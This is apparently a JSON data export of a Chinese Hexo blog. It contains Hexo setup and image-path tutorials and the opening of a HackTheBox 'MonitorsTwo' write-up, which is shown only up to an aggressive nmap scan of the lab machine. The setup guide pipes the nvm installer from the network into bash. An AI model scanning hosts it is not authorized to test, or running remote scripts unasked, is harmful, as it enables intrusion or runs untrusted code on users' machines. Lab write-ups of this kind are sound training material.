{"meta":{"title":"Lucifiel's Blog","subtitle":"Lucifiel 技术博客","description":"Lucifiel 技术博客","author":"Lucifiel","url":"http://www.lucifiel.com","root":"/"},"pages":[{"title":"about","date":"2022-08-03T04:12:29.000Z","updated":"2022-08-04T01:37:12.000Z","comments":true,"path":"about/index.html","permalink":"http://www.lucifiel.com/about/index.html","excerpt":"","text":"我是Lucifiel，路西菲尔是我个人常用ID，一个说书人罢了。 一个以说书为主业的混子，安全只是兴趣爱好之一，喜欢研究所有我感兴趣的东西和技术。 对技术和未知充满兴趣，喜欢研究和琢磨有的没的好玩的。 我的梦想之一就是能被大家提起的时候，有人觉得我是一名世界级的攻防技术研究人员，不过暂时没有什么可以拿得出手的东西。 开博客也只是为了督促自己有一个记录文档的习惯。 有事可以发邮件，我会不定时查看邮箱的 &#x4c;&#117;&#99;&#105;&#x66;&#105;&#x65;&#x6c;&#x48;&#x61;&#99;&#x6b;&#64;&#113;&#113;&#46;&#99;&#111;&#109;。"},{"title":"","date":"2023-05-19T09:01:11.000Z","updated":"2023-05-19T09:01:11.000Z","comments":false,"path":"tags/index.html","permalink":"http://www.lucifiel.com/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-05-19T09:01:34.000Z","updated":"2023-05-19T09:01:34.000Z","comments":false,"path":"categories/index.html","permalink":"http://www.lucifiel.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"解决 Hexo+Github+Typora 图片无法正确显示的问题","slug":"学习记录/解决Hexo+Github+Typora图片无法正确显示的问题","date":"2023-07-24T16:00:00.000Z","updated":"2023-07-24T16:57:33.000Z","comments":true,"path":"2023/07/25/学习记录/解决Hexo+Github+Typora图片无法正确显示的问题/","link":"","permalink":"http://www.lucifiel.com/2023/07/25/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%A7%A3%E5%86%B3Hexo+Github+Typora%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E7%A1%AE%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"前言在之前的【Hexo+GitHub+Indigo 主题搭建博客踩坑日记】中，我们使用 Hexo 搭建好了一个博客，并且成功发布到了网上，接下来就是需要写文章了，而在写文章中通常会加入一些图片来搭配文章，接下来就来解决 Hexo 文章插入文章遇到的一些坑。 引用图片全局资源文件夹在 Hexo 中，最简单的调用图片的方法，就是在 source 目录中新建一个 images（名字可自定义）文件夹，将图片都存入 images 文件夹中，然后在 Markdown 中使用![图片名字](图片地址)的格式，比如我们当前有一个名为 image1.png 的图片，就是![image1](/images/image1.png)，这里的/是指的根目录，而 Hexo 中，资源文件的根目录就是 source 文件夹。 这样我们就插入了一张图片，但是这样做的话有几个麻烦点： 所有的图片都在同一个文件夹下，管理会很混乱很麻烦 每次引用图片都需要去手动输入，当然也可以修改 Typora 的目录地址，直接设置为 images 目录 Typora Web 实际这么做以后会发现在 Typora 中说可以看到图片的，但是在网页渲染中却没有加载出来，我们使用 F12 看看是为什么 这里读取到的地址是 http://localhost:4000/images/image1.png 甚至看渲染记录，连图片都没有渲染，这个方法是真的不好用 文章资源文件夹我们也可以对每篇文章使用一个文件夹作为资源管理文件夹，这个方法的优点是便于结构化管理，但缺点也和第一个方法一样，甚至比方法一更麻烦 具体方案需要修改 hexo 文件夹中的 _config.yml，如下： post_asset_folder: true marked: prependRoot: true postAsset: true 在终端下 cd 到 hexo 文件夹，使用 hexo new [layout] &lt;title&gt; 命令创建一篇新文章，此时会在 source&#x2F;_post 目录下创建一个同名的文件夹和 Markdown 文件。 接着可以把所有该文章有关的资源文件都放在同名的目录中，然后使用引入格式 ![image1](image1.png) 即可引入图片，该方法在有较多文章和较多资源时比较方便管理，但相对的确实比较麻烦 Typora Web 这个方法呢图片 Web 上倒是成功加载了图片，但 Typora 中却没有显示，这样在我们编写的时候是不便于预览修改的 使用网络图片在 Markdown 的语法中，还允许我们引入网络图片，并且这是一个比较不错的方案，因为不用在本地存储图片，更不用考虑格式错误的问题，但相对的如果是自己的图片就需要考虑先上传到图床然后再来引入了。我个人是一个不太相信第三方的人，所有的资料都得拿在自己手里才安全，任何第三方都有可能跑路、倒闭、丢失资料 网络图片引入格式![image1](http://target.com/image1.png) ，直接就可以引入对应地址的图片 Typora Web 这个方法倒是都显示了，确实是比较不错的方法，但是有一个问题，就是图片是不在自己手里的，哪天图床挂了图片就挂了，且无法找回，并且该方法无法离线编辑，因为你网络离线就代表着无法加载网络图片了 hexo-asset-image 方法还有一种方法，用起来很简单但我个人认为是最不好用的方法 需要把 _config.yml 中的 post_asset_image 修改为 true 具体使用方法是 Typora Web 我觉得吧，就很蠢。。。 最终解决方案这里我研究了很多方法，看了不下几百篇文章，最后得出了一个终极解决方案——直接修改hexo-asset-image 插件 首先我们需要安装 hexo-asset-image 插件 npm install hexo-asset-image --save 但是安装后还是没有解决问题哈 然后找到 /node_modules/hexo-asset-image/index.js 这个文件，将它的内容替换为如下内容 &#39;use strict&#39;; var cheerio = require(&#39;cheerio&#39;); // http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string function getPosition(str, m, i) { return str.split(m, i).join(m).length; } var version = String(hexo.version).split(&#39;.&#39;); hexo.extend.filter.register(&#39;after_post_render&#39;, function(data){ var config = hexo.config; if(config.post_asset_folder){ var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, &#39;/&#39;, 1) + 1; else var beginPos = getPosition(link, &#39;/&#39;, 3) + 1; // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;. var endPos = link.lastIndexOf(&#39;/&#39;) + 1; link = link.substring(beginPos, endPos); var toprocess = [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;]; for(var i = 0; i &lt; toprocess.length; i++){ var key = toprocess[i]; var $ = cheerio.load(data[key], { ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false }); $(&#39;img&#39;).each(function(){ if ($(this).attr(&#39;src&#39;)){ // For windows style path, we replace &#39;\\&#39; to &#39;/&#39;. var src = $(this).attr(&#39;src&#39;).replace(&#39;\\\\&#39;, &#39;/&#39;); if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp; !/^\\s*\\//.test(src)) { // For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed. // In addition, to support multi-level local directory. var linkArray = link.split(&#39;/&#39;).filter(function(elem){ return elem != &#39;&#39;; }); var srcArray = src.split(&#39;/&#39;).filter(function(elem){ return elem != &#39;&#39; &amp;&amp; elem != &#39;.&#39;; }); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join(&#39;/&#39;); $(this).attr(&#39;src&#39;, config.root + link + src); console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src); } }else{ console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;); console.info&amp;&amp;console.info($(this)); } }); data[key] = $.html(); } } }); 然后就可以解决无法同时在 Typora 和 Web 上看到图片的问题了","categories":[{"name":"学习记录","slug":"学习记录","permalink":"http://www.lucifiel.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}],"tags":[]},{"title":"Hexo+GitHub+Indigo 主题搭建博客踩坑日记","slug":"学习记录/Hexo-GitHub-Indigo主题搭建博客踩坑日记","date":"2023-06-13T14:01:12.000Z","updated":"2023-06-13T14:01:18.000Z","comments":true,"path":"2023/06/13/学习记录/Hexo-GitHub-Indigo主题搭建博客踩坑日记/","link":"","permalink":"http://www.lucifiel.com/2023/06/13/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Hexo-GitHub-Indigo%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91%E6%97%A5%E8%AE%B0/","excerpt":"","text":"前言平时没有什么做记录的习惯，但这习惯不太好，所以搭建了个博客来改掉这个不好的习惯。 在搭建博客的时候，我做了比较多的选择，先说说我选择每个不同的 cms 的取舍以及它们的优缺点。 WordpressWoredpress 其实是我优先考虑的 cms，但有一个问题，首先是服务器需要维护，其次呢毕竟我也是搞安全的是吧，确实存在被攻击的风险，所以这个方案被我放弃了。 html 静态文件其次我考虑的是 html 静态文件，但相对的首先也是需要维护服务器，也是一笔费用啊，众所周知我这种穷鬼肯定是舍不得出这个钱的是吧？而且 html 静态文件每次更新确实相对是比较麻烦了，所以这个方案也被我放弃了。 Notion 等笔记工具我个人对笔记工具的使用度是相对比较高的，这里我用过的有 Notion、印象笔记、有道笔记、为知笔记、OneNote、语雀等，我先讲讲各自的优缺点和使用感受吧 Notion 优点：我认为 Notion 确实可以称得上有史以来最强大的笔记软件，基于面向对象的设计思路，页面嵌套没有限制，使用空间没有限制，大多数笔记软件付费的功能在 Notion 上都可以免费使用。Notion 的亮点还在于其借助数据库表格的支持，可以衍生出很多不同的玩法。 缺点：上手难度较高，但我认为这不是软件的缺点，而是使用者的缺点。服务器在境外，始终对国内还是没有想象中的那么友好，且原生环境是不支持中文的，但是这一点可以借助有猴脚本进行中文界面翻译。但让我最无法接受的一点是数据没拿在自己手里，对于我这种仓鼠用户来说心里是没有底的，就怕有一天手里的数据就没了，毕竟我有过百度网盘直接清空我整个网盘的经历，丢失了很多的数据，所以这一点在我看来是无法接受的。 使用体验：非常棒的笔记软件，支持度很好，也让我找到了很多其他笔记软件无法带给我的玩法，甚至已经超越了笔记软件。结合 Siri 和快捷指令已经替代了我手机里的记账工具、健康管理工具、备忘录等很多 APP，都已经自己通过 Notion 的数据库表格功能实现了定制化。 印象笔记 优点：使用简单、风格协调设计合理、强大的搜索功能、精致的书签插件，结合插件可以完美保存网上看到的文章，这是让人很心动的功能。 缺点：目录层次太浅，无法满足深层次使用。国内版和国外版差别过大，我不太喜欢这种把客户分层的感觉，就比如一个功能，大家都没有那我可以接受，但别人可以用我不能用我就无法接受这种情况。免费版支持的设备上限太少，我个人的使用环境常用的电脑不止一台，再加上 iPad 和手机，无法达成一个比较好的协调，当然这是我个人的问题，也是我不愿意在这类产品上付费，这不是软件的问题。 使用体验：相对比较不错，但仅是为了支持更多设备而让我付费，这么一点功能无法让我付费。我认为一款产品至少得解决我现有无法解决的情况，才值得我付费，而且还得是同类产品里相对比较优秀的产品才行。 有道笔记 优点：丰富的功能点，较大的免费使用空间，足够大部分人的日常使用了。支持目录无限嵌套、支持协同表格、脑图、模板、Markdown、网页剪辑、截图、笔记加密、翻译等一系列非常不错的功能。满足大部分人的使用场景。 缺点：我自己使用，用不到协同办公，所以相对来说对我没有吸引力。整体设计、编辑器设计有所欠缺，基础体验相对不是很好，界面对我来说优点过于“丑陋”，是我比较无法接受的。 使用体验：功能不错，但界面丑陋我是真的无法接受，不过支持多设备这一点是一个比较不错的优点。 为知笔记 优点：风格简洁素雅、层次分明，自带学术气质，软件界面、交互方面设计的很精致，是我喜欢的风格。支持无限嵌套，对 Markdown 的支持度比较高，比较友好。并且最大的一个亮点就是可以使用自己的服务器，使用 Docker 搭建好为知笔记的服务器即可。 缺点：不支持思维导图，自带的脑图功能导出的界面相对比较迷。多设备之间的同步是有点问题的，无法做到很完美的进行同步。 使用体验：为知笔记如今是我的主力笔记软件，用自己的服务器这一点是最吸引我的点，数据在自己手里才是最放心的。 OneNote 优点：Windows 10 自带的笔记软件，漂亮、免费，OneNote 的结构与交互风格与一般的笔记软件不一样，界面编辑灵活。 缺点：毕竟服务器在国外，国内用户使用的话同步速度和连接速度不太稳定，而且毕竟是 2003 年的“大叔”产品，相对来说有一点过时了，无法满足现在的部分需求。 使用体验：同步真的一言难尽，我是没用多久就放弃了。 语雀 优点：主打知识库建设，可以创建个人知识库、协同知识库以及知识小组，可以提供不同的知识库模板，团队协作上确实不错。 缺点：是它的优点，但也是缺点，就是揉合的功能太多，显得过于杂乱，不是我喜欢的风格。 使用体验：我个人评价是，这是一款国产化的 Notion，并且适配了团队办公的需求。 微信公众号没错，在体验了那么多以后，我还是选择开了个微信公众号来记录和发布文章。 但是有一个问题，微信公众号每天只能推送一篇文章，而且微信公众号是不支持 Markdown 的，只能通过第三方平台进行转换，但是每次搞图片什么的麻烦死了。 Hexo说了这么多，终于回到了我们的主题，那就是：Hexo Hexo 是一款高速、简洁且高效的博客框架。Hexo 使用 Markdown 解析文章，在几秒内即可利用靓丽的主题生成静态网页。并且 Hexo 有大量的插件作为支持，是不可多得的选择。 Hexo 其实就实现了我使用 Html 静态文件作为博客的想法，同时新增文档也不麻烦，还方便编辑，再加上我日常使用的笔记也恰好是 Markdown，所以只需要做一个很简单的移植即可把我的文章都移植到 Hexo 搭建的博客上。 Hexo 搭建博客Hexo 环境安装Windows安装 NVM进入 NVM-Windows 最新发布地址：https://github.com/coreybutler/nvm-windows/releases 选择最新发行版进行下载： 下载的 exe 可执行文件就直接打开，下载的 zip 压缩文件就先解压，然后打开点击安装 注意：NVM 的安装路径下不要有中文 NVM 配置文件地址也不要有中文 安装完成后，在 CMD 或者 Powershell 下输入 NVM，即可看到安装完成： 配置国内源国内这边连接 NVM 和 Node 源比较慢，我们换成国内源： # node使用淘宝源 node_mirror: http://npm.taobao.org/mirrors/node/ # npm使用淘宝源 npm_mirror: https://npm.taobao.org/mirrors/npm/ 安装 Node首先输入 nvm list 查看安装的版本，目前是没有安装任何版本的 之后我们安装 v12.21 版本的 node nvm install 12.21 然后就安装好了 NVM nvm use 12.21.0 选择要使用的 node 版本，即可 安装 Git https://git-scm.com/download/win 下载后进行安装 许可声明 点击 “Next” 下一步 选择安装路径 根据自己的需要选择安装路径 选择安装组件 默认勾选的选项，建议不要动。默认安装了一些组件 Git Bash、Git GUI 以及 Git LFS 还有桌面快捷方式以及配置文件默认的文本编辑，使用 sh 脚本启动 Git Bash 红色框决定在所有控制台窗口中使用 TrueType 字体和是否每天检查 Git 是否有 Windows 更新，按需勾选 选择开始菜单目录 默认 Git 即可，直接 Next 下一步 选择 Git 文件默认的编辑器 很少用到，所以默认 Vim 即可，直接点击 Next 下一步 选择 Git 初始化分支的名称 Git 默认的初始化分支名称为 “master” 根据自己项目业务重新命名，如：main、trunk 或者自己填写 已存在的项目不受影响 选择使用 Git 的方式 第一个选项，只从 Git Bash 命令行工具使用 Git，也是最谨慎的默认选项 第二个选项，从命令行或第三方软件使用 Git 第三个选项，在命令提示符中使用 Git 和可选的 Unix 工具 选择 https 传输后端 让 Git 使用哪个 SSL&#x2F;TLS 库来进行 HTTPS连接 第一个选项，使用 OpenSSL 库，服务器 cer 证书将使用 ca 包中 .crtw 文件进行验证通过，默认选这个 第二个选项，使用本机 Windows 安全通道库，服务器证书将在 Windows 证书存储中进行验证。这个选项还允许通过 Active Directory 域服务使用公司内部根 CA 证书 配置结束行转换方式 Git 应该如何处理文本文件中的行结尾? 第一个选项，下拉是转换 Windows 风格，提交转换 为iunix 风格，在 Windows 这是推荐默认的设置。 第二个选项，下拉时不改变，提交转换为 iunix 风格。对于跨平台项目，这是 Unix 上的推荐设置。 第三个选项，下拉和提交都不进行任何转换，对于跨平台项目(“核心项目”)，不推荐选择此选项。 配置终端模拟器为使用 Git Bash 第一个选项，Git Biash 将使用 MinTTY 作为终端模拟器，它拥有一个可调整大小的窗口，非矩形的选择和 Unicode 字体。Windows 控制台程序(如交互式 Python)必须通过 ‘winpty’ 启动才能在 MinTTY 中工作，默认选择这个更灵活。 第二个选项，使用 Windows 的默认控制台（cmd.exe）,它可以在 Win32 控制台程序中工作，如交互式 Python 或 node.js，但有一个非常有限的默认滚动回滚，需要配置为使用 Unicode 字体，以便正确显示非 ascil 字符，在 Windows 10 之前，它的窗口不能自由调整大小，它只允许矩形文本选择 选择 Git 下拉默认行为 第一个选项，默认(快进或合并)。这是 “git pull” 的标准行为:尽可能快进当前分支到一个被捕获的分支，否则创建合并提交。 第二个选项，将当前分支改为获取的分支。如果没有要重基的本地提交，这相当于快进。 第三个选项，仅仅快进， 快进到获取的分支。如果不可能，就失败。 选择 Git 凭证小助手 Credential helper是帮我们保存凭证（用户密码）他有很多存储模式如：cache，store，manager 和 osxkeychain，默认 wincred，这里根据自己需要选择。 配置额外特性选项 第一个选项，启用文件系统缓存,文件系统数据将被大量读取，并缓存到内存中以用于某些操作(“core。fscache” 设置为 ”true”)。这提供了显著的性能提升。 第二个选项，支持符号链接，启用符号链接(需要 SeCreateSymboliclink 权限)。请注意，现有存储库不受此设置的影响。 启用实验配置选项 启用对伪控制台的实验性支持,(新)这允许在Git Bash窗口中运行原生控制台程序，如 Node 或 Python，而不使用 winpty，但它仍然有已知的 bug,一般用不到 可不勾选 点击 Install 即可安装完毕。 安装完成 Git Bash，是Git配套的一个控制台 启用 安装 Hexo在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo npm install hexo-cli -g 安装完成后查看版本，如果弹出了版本号就是安装成功了 hexo -v Mac&#x2F;LinuxMac 和 Linux 都可以使用编译安装的方法安装 NVM，但 Mac 用户还是推荐使用 Homebrew 来安装 NVM。 安装 NVM本教程来自：https://github.com/nvm-sh/nvm 要安装和更新 NVM，可以使用安装脚本 https://github.com/nvm-sh/nvm/blob/v0.39.3/install.sh。可以手动下载脚本或使用 Curl 和 Wget 命令进行下载： curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash 运行上述任一命令都会下载脚本并运行它。 该脚本将 nvm 存储库克隆到 ~/.nvm，并尝试将下面代码段中的源代码行添加到正确的配置文件（~/.bash_profile、~/.zshrc、~/.profile或~/.bashrc） 之后到环境配置中追加下述内容： export NVM_DIR=&quot;$([ -z &quot;${XDG_CONFIG_HOME-}&quot; ] &amp;&amp; printf %s &quot;${HOME}/.nvm&quot; || printf %s &quot;${XDG_CONFIG_HOME}/nvm&quot;)&quot; [ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; \\. &quot;$NVM_DIR/nvm.sh&quot; # This loads nvm 安装完成后，在终端输入 nvm 未报错 command not find 即为安装成功 配置国内源在终端输入如下内容进行设置国内源 export NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/ 安装 Node使用如下命令安装 Node nvm install 12.21 可以测试一下是否可用 nvm list nvm use 12.21 node -v 安装 GitCentosyum install git -y 在 Centos 下可以使用 yum 安装程序 Ubuntuapt install git -y 在 Ubuntu 等 Debian 架构下可以使用 apt 安装程序 安装 Hexo在上面的环境都安装 在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo npm install hexo-cli -g 安装完成后查看版本，如果弹出了版本号就是安装成功了 hexo -v Mac 专属安装 NVM在安装 Homebrew 的情况下，终端输入： brew install nvm 即可完成安装 配置国内源在终端输入如下内容进行设置国内源 export NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node/ 安装 Node使用如下命令安装 Node nvm install 12.21 可以测试一下是否可用 nvm list nvm use 12.21 node -v 安装 Git直接安装在 Mac 下是会默认安装 Git 的 git --version 可使用上面的命令查看是否安装，如果已经安装会输出 git 的版本 如果没有安装的话，会弹出上述窗口进行安装 点击同意即可 Brew 安装可以利用 Brew 工具包管理器进行 Git 安装，安装方法我会在另一篇 Mac M1 渗透测试环境搭建的文章中写，我就不在这里赘述了 brew install git 然后等待安装完成就行 安装 Hexo在上面的环境都安装完毕后，可以直接使用命令行安装 Hexo npm install hexo-cli -g 安装完成后查看版本，如果弹出了版本号就是安装成功了 hexo -v Hexo 部署博客博客搭建创建一个文件夹，进入文件夹后然后使用 hexo 进行初始化 hexo init 然后就创建完成了我们的初始化博客 hexo s 即可在本地部署博客，即可在浏览器中打开 我们来创建第一篇内容 hexo new test1 hexo s 然后再用 hexo g 编译博客 然后使用 hexo s 在本地部署博客 就可以看到我们的第一篇博客 主题更换博客搭建好了，接下来需要换一个满意的博客主题 https://hexo.io/themes/ 可以在上面选择喜欢的主题 这里我使用的是 Indigo https://github.com/yscoder/hexo-theme-indigo 进入到 hexo 目录中的 themes 目录中 git clone https://github.com/yscoder/hexo-theme-indigo 将主题下载到当前目录下 返回 hexo 的根目录中，打开配置文件 _config.yml，去修改内容 # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: landscape 将第 100 行的 theme: landscape 修改为 hexo-theme-indigo 依赖安装Less主题默认使用 less 作为 css 预处理工具 npm install hexo-renderer-less --save Feed用于生成 rss npm install hexo-generator-feed --save json-content用于生成静态站点数据，用于站内搜索的数据源 npm install hexo-generator-json-content --save QRCode可选，不安装时会请求 jiathis Api 生成二维码 npm install hexo-helper-qrcode --save 纠错这个时候直接运行一下 hexo g hexo s 发现报错了，网页也无法访问 经过大量的踩坑和排查，最后发现是因为默认安装的为 hexo 5，而它不再把 _ 作为全局变量 https://hexo.io/docs/variables#Global-Variables 这里切换为 hexo 4 即可解决这个问题 npm uninstall hexo --save npm install hexo@^4.0.0 --save 然后再尝试搭建服务器 hexo g hexo s 成功搭建并访问 站点配置开启标签页hexo new page tags 修改 hexo/source/tags/index.md 的元数据 layout: tags comments: false --- 开启分类页仅 card theme 支持。 hexo new page categories 修改 hexo/source/categories/index.md 的元数据 layout: categories comments: false --- 基本配置为了得到更好的使用体验，以下内容请务必填写完整，因为这些内容会在主题中得到展示。更多 title: your title subtitle: your subtitle description: your description keywords: your keywords author: your name email: your email url: your site url Feed 配置参考 hexo-generator-feed feed: type: atom path: atom.xml limit: 0 jsonContent 配置为了节约资源，可以对 jsonContent 插件生成的数据字段进行配置，减少数据文件大小。参考 hexo-generator-json-content jsonContent: meta: false pages: false posts: title: true date: true path: true text: true raw: false content: false slug: false updated: false comments: false link: false permalink: false excerpt: false categories: false tags: true 主题配置编辑主题配置文件，themes/indigo/_config.yml。 左侧菜单默认配置如下 menu: home: text: 主页 url: / archives: url: /archives tags: url: /tags github: url: https://github.com/yscoder target: _blank weibo: url: http://www.weibo.com/ysweb target: _blank link: text: 测试 url: / 添加新菜单项时，在 menu 下增加子属性即可。属性说明如下： menu: link: # fontawesome图标，省略前缀，本主题前缀为 icon-，必须 text: About # 菜单显示的文字，如果省略即默认与图标一致，首字母会转大写 url: /about # 链接，绝对或相对路径，必须 target: _blank # 是否跳出，省略则在当前页面打开 fontawesome 图标已集成到主题中，你可以到 这个页面 挑选合适的图标。 favicon站点 logo，显示在浏览器当前标签页左上角。 favicon: /favicon.ico 头像位于左侧菜单上方（官方介绍，但我测试后发现无效） avatar: /img/logo.jpg Email头像下方 email: LucifielHack@qq.com color设置 Android L Chrome 浏览器状态栏颜色，不需要可去除此项或设为 false。 color: &#39;#3F51B5&#39; 页面标题（card theme）自定义归档、标签、分类页的大标题。 tags_title: Tags archives_title: Archives categories_title: Categories 文章摘要可以在 Markdown 文件中加 &lt;!--more--&gt;以分割摘要与文章正文。未设置时，按 excerpt_length 设置截取。 # 文章摘要渲染方式: 为 true 时将渲染为 html，否则为文本 excerpt_render: false # 截断长度 excerpt_length: 200 # 文字正文页链接文字 excerpt_link: 阅读全文... mathjax开启后，使你的站点支持公式渲染，by mathjax。 请按需开启，因为此项需要加载额外的 js 文件。 mathjax: false 分享文章分享开关，by jiathis-api。 share: true 文章打赏默认开启 reward: title: 谢谢大爷~ #显示的文字 wechat: /img/wechat.jpg #微信，关闭设为 false alipay: /img/alipay.jpg #支付宝，关闭设为 false 此外在 crad theme 中，可以通过在 markdown 头部添加 reward: false 来控制某些不想开启打赏的页面。 关闭 reward: false 二维码请自行从微信、支付宝中下载。当两个二维码同时存在时，为保持显示效果的一致性，注意截图时的边框留白保持一致。必要时可借助PS等图片处理工具进行图片大小裁剪、压缩等。 站内搜索是否开启搜索 search: true 布局开启后，文章页在大屏下会隐藏左侧菜单，专注阅读。 hideMenu: true Toc开启文章内容导航。 #toc: false #关闭 toc: list_number: false # 决定导航使用的标签， true 为 ol， false 为 ul。 copyright（card theme）文章页版权声明内容，hexo中所有变量及辅助函数等均可调用，具体请查阅 hexo.io。 copyright: 这里写留言或版权声明：&lt;a href=&quot;&lt;%- url_for(page.path) %&gt;&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;%- url %&gt;&lt;/a&gt; Less设置 less 编译时的入口文件路径，hexo-renderer-less。 less: compress: true # 是否压缩css paths: - source/css/style.less 评论集成了 disqus、友言、gitment 和 valine，开启其一即可。 数据统计集成的有谷歌、腾讯、百度和 CNZZ，请填写你的站点标识。 google_analytics: key tajs: 站点id baidu_tongji: 站点id cnzz: 站点id 谷歌站点验证（card theme）google_site_verification: false 规范网址（card theme）让搜索引擎重定向你的不同域名、不同子域、同域不同目录的站点到你期望的路径。使用规范网址 canonical: http://imys.net 版权起始年份since_year: 2006 自定义页面关于用户页面中作者相关的描述性文字，如不需要设为 false about: 用户页面中作者相关的描述性文字，如不需要设为 false CDN开启后将使用 unpkg cdn 最新的主题样式，如果想让你的自定义样式生效，把此项设为 false。 cdn: true lightbox文章图片灯箱效果。 lightbox: true ICP 备案号ICP_license: 京ICP备1234556号-1 使用 Github 搭建博客注册 Github 账号使用 Github 搭建博客，首先咱们肯定得需要个 Github 账号吧？教人教到底，咱们先去注册个账号 点 Sign up 注册 输入注册的邮箱 输入账号密码后注册即可 然后会向邮箱发送一封邮件，里面一个验证码，输入后即可注册 注册并登录后看到的应该是这种界面，因为我的账号使用了很久了，所以这里有一些东西，我就打个马赛克了 创建个人仓库 点击 New repository 创建一个新的仓库 这里的仓库名是 xxx.github.io，其中 xxx 是你的仓库名，比如我的就是 LucifielHack。 必须得按照这个格式设置，否则是无法解析的 点击创建后，会进入这个界面，这也是在告诉我们如何设置 生成 SSH 添加到 Github生成 SSH 添加到 Github ，连接 Github 与本地 右键桌面打开 Git Bash ，然后输入下面的命令： git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 注意：第一次使用 git 后需要将用户名和邮箱进行初始化 这里的 name 和 email 分别是 Github 的用户名和邮箱，根据自己的注册信息填写就可以了 git config user.name git config user.email 可以用上面两条命令确认自己是否输入正确 然后创建 SSH，一路回车即可 ssh-keygen -t rsa -C &quot;youremail&quot; ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。 这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹。或者git bash中输入 cat ~/.ssh/id_rsa.pub 将 id_rsa.pub 的内容复制好 挨个点击 Settings –&gt; Deploy keys –&gt; Add deploy key 然后名字随便取一个就行，把 id_rsa.pub 的内容粘贴到 Key 中 在 git bash 中输入 ssh -T git@github.com ，如果出现 Hi xxx/xxx.github.io! You&#39;ve successfully authenticated,but Github does not provide shell access.即为设置成功 将 Hexo 部署到 Github打开博客根目录下的 _config.yml 文件 # Deployment ## Docs: https://hexo.io/docs/one-command-deployment deploy: type: &#39;&#39; 这是最后一部分，102 行的内容，将它修改为 # Deployment ## Docs: https://hexo.io/docs/one-command-deployment deploy: type: git repository: https://github.com/LucifielHack/LucifielHack.github.io branch: master 其中的 repository 修改为自己的 Github 仓库地址即可 然后需要安装 deploy-git 插件，也就是部署到 Github 的命令，这样才可以使用命令行部署到 Github npm install hexo-deployer-git --save 然后 hexo clean hexo g hexo d 即可发布到 Github 然后等待几分钟即可更新成功 接着去 http://yourname.github.io 这个网站即可看到你的博客 设置自定义域名大家如果有自己的域名的话，可以设置用自己的域名来解析 点击 Settings –&gt; Pages –&gt; Custom domain 将 Custom domain 中的地址设置为自己的域名 然后去自己的域名商添加一条解析记录 然后就可以通过自己的域名访问到 Github 搭建的 Hexo 博客了","categories":[{"name":"学习记录","slug":"学习记录","permalink":"http://www.lucifiel.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}],"tags":[]},{"title":"MonitorsTwo - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-MonitorsTwo","date":"2023-05-07T11:38:36.000Z","updated":"2023-11-13T08:54:29.115Z","comments":true,"path":"2023/05/07/Hackthebox/Easy/Hackthebox-MonitorsTwo/","link":"","permalink":"http://www.lucifiel.com/2023/05/07/Hackthebox/Easy/Hackthebox-MonitorsTwo/","excerpt":"","text":"Hackthebox - MonitorsTwo靶场信息 靶场难度 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 07:05 CST Nmap scan report for 10.10.11.211 Host is up (0.15s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/8%OT=22%CT=1%CU=41839%PV=Y%DS=2%DC=T%G=Y%TM=64582EE3 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11 